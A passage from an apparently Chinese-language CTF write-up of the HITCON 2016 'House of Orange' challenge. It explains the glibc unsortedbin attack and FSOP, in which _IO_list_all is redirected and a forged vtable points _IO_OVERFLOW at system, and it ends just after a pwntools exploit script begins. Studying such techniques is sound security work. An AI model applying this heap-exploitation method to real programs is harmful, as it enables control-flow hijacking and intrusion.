<p>&#x4E0A;&#x8FF0;&#x4EE3;&#x7801;&#x662F;unsortedbin attack&#x7684;&#x5173;&#x952E;&#xFF0C;&#x8986;&#x76D6;unsortedbin chunk&#x7684;bk&#x65F6;&#xFF0C;&#x4E5F;&#x5C06;fd&#x8986;&#x76D6;&#x4E3A;&#x4E86;&#x5783;&#x573E;&#x6570;&#x636E;&#xFF0C;&#x6B64;&#x65F6;glibc&#x5224;&#x65AD;unsortedbin&#x4E2D;&#x4E0D;&#x6B62;&#x6709;&#x4E00;&#x4E2A;freechunk&#xFF0C;&#x5C31;&#x5C06;&#x5176;&#x89E3;&#x5F15;&#x7528;&#xFF0C;&#x6B64;&#x65F6;&#x6307;&#x9488;<code>_IO_list_all</code>&#x5C31;&#x6307;&#x5411;&#x4E86;<code>main_arena</code>&#x7ED3;&#x6784;&#x4F53;&#x4E2D;top&#x5BF9;&#x5E94;&#x7684;&#x5730;&#x5740;&#xFF0C;&#x5373;main_arena+88&#x4E5F;&#x5C31;&#x662F;unsorted bin&#x5934;&#x7684;&#x5730;&#x5740;&#xFF0C;unsortedbin attack&#x5B8C;&#x6210;&#x3002;</p>
<p>&#x4E0B;&#x9762;&#x8BF4;&#x4E00;&#x4E0B;&#x4E3A;&#x4EC0;&#x4E48;&#x6211;&#x4EEC;&#x4FEE;&#x6539;unsortedbin chunk&#x7684;&#x5927;&#x5C0F;&#x4E3A;0x61&#x540E;&#xFF0C;&#x518D;&#x6B21;&#x5806;&#x7533;&#x8BF7;&#x64CD;&#x4F5C;&#x540E;&#xFF0C;&#x8BE5;chunk&#x88AB;&#x94FE;&#x63A5;&#x5230;smallbin&#x4E2D;&#x3002;</p>
<p>&#x5728;&#x4E0A;&#x9762;unsortedbin chunk&#x89E3;&#x5F15;&#x7528;&#x540E;&#xFF1A;</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* place chunk in bin */</span></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (size))</span><br><span class="line">            {</span><br><span class="line">              victim_index = smallbin_index (size);</span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line">            }</span><br></pre></td></tr></table></figure>
<p>&#x8FD9;&#x4E2A;size&#x662F;unsortedbin chunk&#x7684;&#x5927;&#x5C0F;&#xFF0C;&#x4E0A;&#x9762;&#x7684;&#x5206;&#x914D;&#x90FD;&#x5931;&#x8D25;&#x540E;&#xFF0C;glibc&#x4F1A;&#x628A;unsortedbin&#x4E2D;&#x7684;chunk&#x63D2;&#x5165;&#x5230;smallbins&#x6216;&#x8005;largebins&#x3002;</p>
<p>&#x6240;&#x4EE5;&#x4FEE;&#x6539;unsortedbin chunk&#x7684;&#x5927;&#x5C0F;&#x4E3A;0x61&#x540E;&#xFF0C;&#x518D;&#x6B21;&#x5806;&#x7533;&#x8BF7;&#x64CD;&#x4F5C;&#x540E;&#xFF0C;&#x8BE5;chunk&#x88AB;&#x94FE;&#x63A5;&#x5230;smallbin&#x4E2D;&#x3002;</p>
<h2 id="0x02-&#x4E3A;&#x4EC0;&#x4E48;&#x8981;&#x8BA9;topchunk&#x4EE5;brk&#x7684;&#x65B9;&#x5F0F;&#x6269;&#x5BB9;"><a href="#0x02-&#x4E3A;&#x4EC0;&#x4E48;&#x8981;&#x8BA9;topchunk&#x4EE5;brk&#x7684;&#x65B9;&#x5F0F;&#x6269;&#x5BB9;" class="headerlink" title="0x02 &#x4E3A;&#x4EC0;&#x4E48;&#x8981;&#x8BA9;topchunk&#x4EE5;brk&#x7684;&#x65B9;&#x5F0F;&#x6269;&#x5BB9;"></a>0x02 &#x4E3A;&#x4EC0;&#x4E48;&#x8981;&#x8BA9;topchunk&#x4EE5;brk&#x7684;&#x65B9;&#x5F0F;&#x6269;&#x5BB9;</h2><p>malloc&#x5C0F;&#x4E8E;128k&#x7684;&#x5185;&#x5B58;&#xFF0C;&#x4F7F;&#x7528;brk&#x5206;&#x914D;&#x5185;&#x5B58;&#xFF0C;&#x5C06;heap_base&#x5F80;&#x9AD8;&#x5730;&#x5740;&#x63A8;(&#x53EA;&#x5206;&#x914D;&#x865A;&#x62DF;&#x7A7A;&#x95F4;&#xFF0C;&#x4E0D;&#x5BF9;&#x5E94;&#x7269;&#x7406;&#x5185;&#x5B58;(&#x56E0;&#x6B64;&#x6CA1;&#x6709;&#x521D;&#x59CB;&#x5316;)&#xFF0C;&#x7B2C;&#x4E00;&#x6B21;&#x8BFB;/&#x5199;&#x6570;&#x636E;&#x65F6;&#xFF0C;&#x5F15;&#x8D77;&#x5185;&#x6838;&#x7F3A;&#x9875;&#x4E2D;&#x65AD;&#xFF0C;&#x5185;&#x6838;&#x624D;&#x5206;&#x914D;&#x5BF9;&#x5E94;&#x7684;&#x7269;&#x7406;&#x5185;&#x5B58;&#xFF0C;&#x7136;&#x540E;&#x865A;&#x62DF;&#x5730;&#x5740;&#x7A7A;&#x95F4;&#x5EFA;&#x7ACB;&#x6620;&#x5C04;&#x5173;&#x7CFB;)&#x3002;</p>
<p>malloc&#x5927;&#x4E8E;128k&#x7684;&#x5185;&#x5B58;&#xFF0C;&#x4F7F;&#x7528;mmap&#x5206;&#x914D;&#x5185;&#x5B58;&#xFF0C;&#x5728;&#x5806;&#x548C;&#x6808;&#x4E4B;&#x95F4;&#x627E;&#x4E00;&#x5757;&#x7A7A;&#x95F2;&#x5185;&#x5B58;&#x5206;&#x914D;(&#x5BF9;&#x5E94;&#x72EC;&#x7ACB;&#x5185;&#x5B58;&#xFF0C;&#x800C;&#x4E14;&#x521D;&#x59CB;&#x5316;&#x4E3A;0)</p>
<p>&#x4E3A;&#x4E86;&#x65B9;&#x4FBF;&#x5BF9;&#x5185;&#x5B58;&#x7684;&#x8BFB;&#x5199;&#xFF0C;&#x6240;&#x4EE5;&#x8981;&#x8BA9;topchunk&#x4EE5;brk&#x7684;&#x65B9;&#x5F0F;&#x6269;&#x5BB9;</p>
<h2 id="0x03-&#x4E3A;&#x4EC0;&#x4E48;chunk&#x4E2D;&#x4F1A;&#x6CC4;&#x9732;libc&#x548C;chunk&#x7684;&#x5730;&#x5740;"><a href="#0x03-&#x4E3A;&#x4EC0;&#x4E48;chunk&#x4E2D;&#x4F1A;&#x6CC4;&#x9732;libc&#x548C;chunk&#x7684;&#x5730;&#x5740;" class="headerlink" title="0x03 &#x4E3A;&#x4EC0;&#x4E48;chunk&#x4E2D;&#x4F1A;&#x6CC4;&#x9732;libc&#x548C;chunk&#x7684;&#x5730;&#x5740;"></a>0x03 &#x4E3A;&#x4EC0;&#x4E48;chunk&#x4E2D;&#x4F1A;&#x6CC4;&#x9732;libc&#x548C;chunk&#x7684;&#x5730;&#x5740;</h2><p>&#x7531;&#x4E8E;largebin&#x7684;&#x94FE;&#x8868;&#x4E2D;&#x6BCF;&#x4E2A;bin&#x5927;&#x5C0F;&#x4E0D;&#x4E00;&#x5B9A;&#x76F8;&#x540C;&#xFF0C;&#x6240;&#x4EE5;fd_nextsize&#x548C;bk_nextsize&#x8BB0;&#x5F55;&#x4E86;&#x81EA;&#x5DF1;&#x524D;&#x4E00;&#x4E2A;&#x548C;&#x540E;&#x4E00;&#x4E2A;&#x4E0E;&#x81EA;&#x5DF1;&#x4E0D;&#x540C;&#x5927;&#x5C0F;&#x7684;bin&#x7684;&#x5730;&#x5740;(&#x53EA;&#x4F1A;&#x8BB0;&#x5F55;&#x540C;&#x4E00;&#x94FE;&#x8868;&#x4E0A;&#x7684;&#x5173;&#x7CFB;&#xFF0C;&#x5982;&#x679C;&#x94FE;&#x8868;&#x4E0A;&#x53EA;&#x6709;&#x4E00;&#x4E2A;bin&#x7684;&#x8BDD;&#x5219;&#x5176;&#x4E24;&#x4E2A;nextsize&#x90FD;&#x6307;&#x5411;&#x81EA;&#x5DF1;)&#xFF0C;&#x6240;&#x4EE5;&#x4F1A;&#x6CC4;&#x9732;heap&#x5730;&#x5740;&#x3002;</p>
<p>fd&#xFF0C;bk&#x4E2D;&#x6CC4;&#x9732;&#x7684;&#x662F;main_arean&#x7684;&#x5730;&#x5740;</p>
<h2 id="0x04-House-of-Orange&#x7A0B;&#x5E8F;&#x5206;&#x6790;"><a href="#0x04-House-of-Orange&#x7A0B;&#x5E8F;&#x5206;&#x6790;" class="headerlink" title="0x04 House of Orange&#x7A0B;&#x5E8F;&#x5206;&#x6790;"></a>0x04 House of Orange&#x7A0B;&#x5E8F;&#x5206;&#x6790;</h2><p>&#x901A;&#x8FC7;&#x5206;&#x6790;&#x7A0B;&#x5E8F;&#xFF0C;&#x53EF;&#x4EE5;&#x603B;&#x7ED3;&#x6709;&#x4E24;&#x4E2A;&#x7ED3;&#x6784;&#x4F53;</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">house</span>{</span></span><br><span class="line">    <span class="number">8b</span>ytes <span class="class"><span class="keyword">struct</span> <span class="title">orange</span> * <span class="title">p</span>;</span></span><br><span class="line">    <span class="number">8b</span>ytes <span class="keyword">char</span> * name;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">orange</span>{</span></span><br><span class="line">    <span class="number">4b</span>ytes <span class="keyword">int</span> price;</span><br><span class="line">    <span class="number">4b</span>ytes <span class="keyword">int</span> color;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
<p>&#x5F53;&#x7A0B;&#x5E8F;&#x6267;&#x884C;&#x5B8C;&#x4E00;&#x6B21;build&#x51FD;&#x6570;&#x65F6;&#xFF0C;&#x5806;&#x4E2D;&#x7684;&#x7ED3;&#x6784;&#x5982;&#x4E0B;</p>
<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="code">+------------+</span></span><br><span class="line">| orange * p |	#chunksize:0x20 			&#x4F4E;&#x5730;&#x5740;</span><br><span class="line">| char * name|</span><br><span class="line"><span class="code">+------------+</span></span><br><span class="line">|    name    |  </span><br><span class="line"><span class="code">+------------+</span></span><br><span class="line">|  int price |  #chunksize:0x20				&#x9AD8;&#x5730;&#x5740;</span><br><span class="line">|  int color | </span><br><span class="line"><span class="code">+------------+</span></span><br></pre></td></tr></table></figure>
<p>upgrade&#x51FD;&#x6570;&#x5B58;&#x5728;&#x6EA2;&#x51FA;&#xFF0C;&#x4FEE;&#x6539;name&#x7684;&#x5185;&#x5BB9;&#xFF0C;&#x8FDB;&#x800C;&#x6EA2;&#x51FA;&#x4FEE;&#x6539;topchunk&#x7684;&#x6570;&#x636E;</p>
<h2 id="0x05-&#x5229;&#x7528;&#x8FC7;&#x7A0B;FSOP-File-Stream-Oriented-Programming"><a href="#0x05-&#x5229;&#x7528;&#x8FC7;&#x7A0B;FSOP-File-Stream-Oriented-Programming" class="headerlink" title="0x05 &#x5229;&#x7528;&#x8FC7;&#x7A0B;FSOP(File Stream Oriented Programming)"></a>0x05 &#x5229;&#x7528;&#x8FC7;&#x7A0B;<strong>FSOP</strong>(File Stream Oriented Programming)</h2><h3 id="&#x5229;&#x7528;&#x7684;&#x89E6;&#x53D1;&#x70B9;"><a href="#&#x5229;&#x7528;&#x7684;&#x89E6;&#x53D1;&#x70B9;" class="headerlink" title="&#x5229;&#x7528;&#x7684;&#x89E6;&#x53D1;&#x70B9;"></a>&#x5229;&#x7528;&#x7684;&#x89E6;&#x53D1;&#x70B9;</h3><p>&#x6211;&#x4EEC;&#x4FEE;&#x6539;&#x4E86;unsortedbin chunk&#x7684;fd&#x548C;bk&#xFF0C;&#x6240;&#x4EE5;malloc&#x65F6;&#x4F1A;&#x51FA;&#x9519;</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)|| __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">    malloc_printerr (check_action, <span class="string">&quot;malloc(): memory corruption&quot;</span>, chunk2mem (victim), av);</span><br></pre></td></tr></table></figure>
<p>&#x51FD;&#x6570;&#x8C03;&#x7528;&#x94FE;&#x4E3A;&#xFF1A;<code>malloc_printerr-&gt;__libc_message-&gt;abort-&gt;_IO_flush_all_lockp</code></p>
<p>&#x6700;&#x540E;<code>_IO_flush_all_lockp</code>&#x4F1A;&#x8C03;&#x7528;vtable&#x4E2D;&#x7684;<code>_IO_OVERFLOW</code>&#x51FD;&#x6570;&#xFF0C;&#x8C03;&#x7528;&#x5173;&#x7CFB;&#x5982;&#x4E0B;&#xFF1A;</p>
<p><img src="/2019/03/27/2016-Hitcon-House-of-Orange/abort_routine.jpeg" alt="&#xE6;&#xB5;&#x81;&#xE7;&#xA8;&#x8B;&#xE5;&#x9B;&#xBE;"></p>
<p>&#x6240;&#x4EE5;&#x6700;&#x7EC8;&#x76EE;&#x7684;&#x662F;&#x4FEE;&#x6539;vtable&#x4E2D;&#x7684;<code>_IO_OVERFLOW</code>&#x4E3A;<code>system</code></p>
<h3 id="&#x5229;&#x7528;&#x6761;&#x4EF6;"><a href="#&#x5229;&#x7528;&#x6761;&#x4EF6;" class="headerlink" title="&#x5229;&#x7528;&#x6761;&#x4EF6;"></a>&#x5229;&#x7528;&#x6761;&#x4EF6;</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> _IO_flush_all_lockp (<span class="keyword">int</span> do_lock)</span><br><span class="line">{</span><br><span class="line">  ...</span><br><span class="line">  fp = (_IO_FILE *) _IO_list_all;</span><br><span class="line">  <span class="keyword">while</span> (fp != <span class="literal">NULL</span>)</span><br><span class="line">  {</span><br><span class="line">       ...</span><br><span class="line">        <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">#<span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span><br><span class="line">        || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">        &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">                    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line">#endif</span><br><span class="line">        ) &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">        ...</span><br><span class="line">        ...</span><br><span class="line">        fp = fp-&gt;_chain;</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
<p>&#x89C2;&#x5BDF;<code>_IO_flush_all_lockp</code>&#x53EF;&#x4EE5;&#x53D1;&#x73B0;&#xFF0C;&#x8981;&#x60F3;&#x6210;&#x529F;&#x8C03;&#x7528;<code>_IO_OVERFLOW</code>&#x9700;&#x8981;&#x4E00;&#x4E9B;&#x6761;&#x4EF6;&#xFF1A;</p>
<ul>
<li>fp-&gt;_mode &lt;= 0</li>
<li><p>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</p>
<p>&#x6216;</p>
</li>
<li><p>_IO_vtable_offset (fp) == 0</p>
</li>
<li>fp-&gt;_mode &gt; 0</li>
<li>fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base<br>&#x7B2C;&#x4E00;&#x79CD;&#x5229;&#x7528;&#x6761;&#x4EF6;&#x6BD4;&#x8F83;&#x597D;&#x6784;&#x9020;&#xFF0C;&#x56E0;&#x6B64;&#x5C1D;&#x8BD5;&#x7528;&#x7B2C;&#x4E00;&#x79CD;</li>
</ul>
<h3 id="&#x5229;&#x7528;&#x8FC7;&#x7A0B;"><a href="#&#x5229;&#x7528;&#x8FC7;&#x7A0B;" class="headerlink" title="&#x5229;&#x7528;&#x8FC7;&#x7A0B;"></a>&#x5229;&#x7528;&#x8FC7;&#x7A0B;</h3><ol>
<li>&#x83B7;&#x5F97;&#x4E00;&#x4E2A;unsortedbin&#x3002;&#x901A;&#x8FC7;0x01&#x4E2D;&#x5173;&#x4E8E;glibc&#x5206;&#x914D;chunk&#x8FC7;&#x7A0B;&#x7684;&#x5185;&#x5BB9;&#xFF0C;&#x6211;&#x4EEC;&#x77E5;&#x9053;&#xFF0C;&#x5F53;&#x7533;&#x8BF7;&#x5185;&#x5B58;&#x5927;&#x5C0F;&#x5927;&#x4E8E;topchunk&#x7684;&#x5927;&#x5C0F;&#x65F6;&#xFF0C;&#x7A0B;&#x5E8F;&#x4F1A;&#x8C03;&#x7528;<code>sysmalloc</code>&#x6765;&#x5411;&#x7CFB;&#x7EDF;&#x7533;&#x8BF7;&#x66F4;&#x591A;&#x7684;&#x7A7A;&#x95F4;&#xFF0C;&#x5177;&#x4F53;&#x5206;&#x4E3A;sbrk()&#x548C;mmap()&#xFF0C;&#x5F53;&#x7533;&#x8BF7;&#x7684;&#x5185;&#x5B58;&#x5C0F;&#x4E8E;mmap_threshold(128*1024Bytes)&#x65F6;&#xFF0C;&#x4F1A;&#x8C03;&#x7528;sbrk()&#x7533;&#x8BF7;&#x5185;&#x5B58;&#xFF0C;&#x5728;&#x539F;&#x6709;&#x5806;&#x4E0A;&#x8FDB;&#x884C;&#x6269;&#x5BB9;&#x3002;&#x540C;&#x65F6;sysmalloc&#x4F1A;&#x8C03;&#x7528;_int_free()&#xFF0C;&#x91CA;&#x653E;&#x539F;&#x6709;&#x7684;topchunk&#x5230;unsortedbin&#x3002;</li>
<li><p>&#x901A;&#x8FC7;unsortedbin attack&#x5C06;<code>_IO_list_all</code>&#x6307;&#x9488;&#x6307;&#x5411; <code>main_arena+88</code> &#xFF0C;&#x5373;&#x5C06;main_arena&#x7ED3;&#x6784;&#x4F53;&#x4E2D;top&#x5BF9;&#x5E94;&#x7684;&#x5730;&#x5740;&#xFF0C;&#x4E0B;&#x4E3A;&#x5C01;&#x88C5;main_arena&#x4FE1;&#x606F;&#x7684;&#x7ED3;&#x6784;&#x4F53;</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">  <span class="comment">/* Serialize access.  */</span></span><br><span class="line">  <span class="keyword">mutex_t</span> mutex;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Flags (formerly in max_fast).  */</span></span><br><span class="line">  <span class="keyword">int</span> flags;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Fastbins */</span></span><br><span class="line">  mfastbinptr fastbinsY[NFASTBINS];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></span><br><span class="line">  mchunkptr top;<span class="comment">//&#x6B64;&#x5730;&#x5740;&#x5C06;&#x88AB;&#x5199;&#x5165;_IO_list_all</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The remainder from the most recent split of a small request */</span></span><br><span class="line">  mchunkptr last_remainder;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">  mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Bitmap of bins */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> binmap[BINMAPSIZE];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list for free arenas.  Access to this field is serialized</span></span><br><span class="line"><span class="comment">     by free_list_lock in arena.c.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Number of threads attached to this arena.  0 if the arena is on</span></span><br><span class="line"><span class="comment">     the free list.  Access to this field is serialized by</span></span><br><span class="line"><span class="comment">     free_list_lock in arena.c.  */</span></span><br><span class="line">  INTERNAL_SIZE_T attached_threads;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Memory allocated from the system in this arena.  */</span></span><br><span class="line">  INTERNAL_SIZE_T system_mem;</span><br><span class="line">  INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">};</span><br></pre></td></tr></table></figure>
</li>
</ol>
<ol start="3">
<li><p>glibc&#x5C06;<code>main_arena+88</code>&#x5F53;&#x6210;&#x4E86;&#x4E00;&#x4E2A;<code>IO_FILE_plus</code>&#x7ED3;&#x6784;&#x4F53;&#xFF0C;&#x53D1;&#x73B0;&#x4E00;&#x4E9B;if&#x4E0D;&#x6EE1;&#x8DB3;&#xFF0C;&#x901A;&#x8FC7;<code>struct _IO_FILE *_chain</code>&#x5BFB;&#x627E;&#x4E0B;&#x4E00;&#x4E0B;<code>IO_FILE_plus</code>&#x6587;&#x4EF6;&#x6D41;</p>
</li>
<li><p><code>struct _IO_FILE *_chain</code>&#x5728;<code>_IO_FILE_plus</code>&#x7ED3;&#x6784;&#x4F53;&#x504F;&#x79FB;<code>0x68</code>&#x5904;&#xFF0C;&#x800C; <code>main_arena+88</code> (unsorted bin&#x5934;&#x7684;&#x5730;&#x5740;) &#x504F;&#x79FB;0x68&#x5904;&#x6B63;&#x597D;&#x662F;&#x5B58;&#x50A8;0x60 freechunk&#x7684;smallbin&#x7684;bk&#xFF0C;&#x800C;&#x91CC;&#x9762;&#x7684;&#x5185;&#x5BB9;&#x65F6;&#x53EF;&#x4EE5;&#x63A7;&#x5236;&#x7684;</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">+<span class="number">0x00</span> [       top        |  last_remainder   ]</span><br><span class="line">+<span class="number">0x10</span> [ unsorted bin fd  |  unsorted bin bk  ]</span><br><span class="line">+<span class="number">0x20</span> [ smallbin <span class="number">0x20</span> fd | smallbin <span class="number">0x20</span> bk  ]</span><br><span class="line">+<span class="number">0x30</span> [ smallbin <span class="number">0x30</span> fd | smallbin <span class="number">0x30</span> bk  ]</span><br><span class="line">+<span class="number">0x40</span> [ smallbin <span class="number">0x40</span> fd | smallbin <span class="number">0x40</span> bk  ]</span><br><span class="line">+<span class="number">0x50</span> [ smallbin <span class="number">0x50</span> fd | smallbin <span class="number">0x50</span> bk  ]</span><br><span class="line">+<span class="number">0x60</span> [ smallbin <span class="number">0x60</span> fd | smallbin <span class="number">0x60</span> bk  ]</span><br></pre></td></tr></table></figure>
</li>
<li><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5C06;&#x539F;&#x6765;&#x662F;topchunk&#xFF0C;&#x88AB;glibc&#x91CA;&#x653E;&#x6389;&#x53D8;&#x6210;unsortedbin chunk&#x7684;chunksize&#x6539;&#x4E3A;0x61&#xFF0C;&#x901A;&#x8FC7;&#x6807;&#x9898;0x01&#x53EF;&#x77E5;&#xFF0C;&#x8BE5;chunk&#x4F1A;&#x88AB;&#x52A0;&#x5165;&#x5230;smallbins&#x4E2D;&#xFF0C;&#x8BE5;smallbin&#x7684;fd&#xFF0C;bk&#x90FD;&#x4F1A;&#x53D8;&#x6210;&#x8BE5;chunk&#x7684;&#x5730;&#x5740;&#x3002;&#x5F53;&#x524D; <code>_IO_list_all</code>&#x6307;&#x5411;&#x7684;&#x5185;&#x5BB9;&#x4E0D;&#x6EE1;&#x8DB3;&#x6267;&#x884C;_IO_OVERFLOW&#xFF0C;&#x8FDB;&#x800C;&#x901A;&#x8FC7;<code>fp-&gt;_chain</code>&#x5BFB;&#x627E;&#x4E0B;&#x4E00;&#x4E2A;<code>_IO_FILE</code>&#x65F6;&#xFF0C;&#x5C31;&#x4F1A;&#x6839;&#x636E;smallbin&#x7684;bk&#x5BFB;&#x627E;&#x5230;0x60<code>smallbin</code>&#x4E2D;&#x7684;chunk&#x3002;</p>
</li>
<li><p>&#x4E4B;&#x540E;&#x56DE;&#x8C03;&#x7528;&#x865A;&#x8868;&#x51FD;&#x6570;&#xFF0C;&#x6211;&#x4EEC;&#x5C06;vtable&#x6307;&#x9488;&#x4FEE;&#x6539;&#x4E3A;&#x4F2A;&#x9020;&#x7684;<code>_IO_FILE_plus</code>chunk&#x7684;&#x540E;&#x9762;&#x7684;&#x5806;&#x5185;&#x5B58;&#xFF0C;&#x5C06;<code>_IO_OVERFLOW</code>&#x4FEE;&#x6539;&#x4E3A;system&#xFF0C;&#x5373;&#x6210;&#x529F;&#x52AB;&#x6301;&#x7684;&#x63A7;&#x5236;&#x6D41;</p>
</li>
</ol>
<h2 id="0x06-EXP"><a href="#0x06-EXP" class="headerlink" title="0x06 EXP"></a>0x06 EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&apos;./houseoforange&apos;</span>)</span><br><span class="line">elf = ELF(<span class="string">&apos;./houseoforange&apos;</span>)</span><br><span class="line">libc = ELF(<span class="string">&apos;./libc&apos;</span>)</span><br><span class="line">DEBUG = <span class="number">0</span></span><br><span class="line">VERBOSE = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">	gdb.attach(p)</span><br><span class="line"><span class="keyword">if</span> 